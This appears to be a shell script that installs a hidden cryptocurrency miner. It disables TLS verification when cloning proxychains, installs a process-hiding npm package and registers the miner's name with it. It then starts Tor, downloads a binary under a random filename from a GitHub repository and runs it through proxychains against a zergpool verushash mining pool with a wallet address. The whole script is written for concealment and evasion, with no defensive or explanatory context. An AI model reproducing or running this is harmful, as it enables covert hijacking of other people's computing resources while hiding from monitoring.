show_cursor() {
    tput cnorm
    exit
}
hide_cursor() {
    tput civis
}

trap show_cursor INT TERM
hide_cursor

file=$(openssl rand -hex 6) &&  sh=$(openssl rand -hex 6)  && GIT_SSL_NO_VERIFY=true git clone https://github.com/rofl0r/proxychains-ng.git &&  cd proxychains-ng &&  ./configure --prefix=/usr --sysconfdir=/etc &&  make &&  sudo make install &&  sudo make install-config &&  cd /root && apt install screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add mavic && apt install tor -y > /dev/null && sleep 60 && wget https://github.com/Nsavtu/nigagjs/raw/main/mavic -O $file && chmod 777 $file && service tor start && proxychains4 ./$file -v -l verushash.na.mine.zergpool.com:3300 -u TViBG1vKVo1kzn1R2D4qcU3rVGje6U1CGS -p  c=TRX,mc=VRSC,ID=Tuyf

show_cursor
